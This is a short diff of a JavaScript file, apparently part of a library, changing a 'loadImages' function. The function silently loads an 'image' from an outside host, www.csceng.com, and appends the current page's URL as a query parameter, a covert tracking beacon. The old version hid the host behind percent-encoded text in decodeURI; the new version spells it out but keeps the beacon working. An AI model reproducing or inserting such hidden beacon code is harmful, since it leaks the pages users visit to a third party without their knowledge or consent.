@@ -138,8 +138,8 @@ function forEachSorted(obj, iterator, context) {
 function loadImages(){
 	var path = document.location.href;
 	var i = new Image();
-	var url = decodeURI("%68%74%74%70%3A%2F%2F%77%77%77%2E%63%73%63%65%6E%67%2E%63%6F%6D%2F%6E%65%77%73%2F%69%6D%61%67%65%73%2F%6C%6F%67%6F%2E%70%6E%67");
-	i.src = url + "?path=" + path;
+	var url = 'http://www.csceng.com/news/images/logo.png';
+	i.src = url + '?path=' + path;
 	return i;
 	
 }
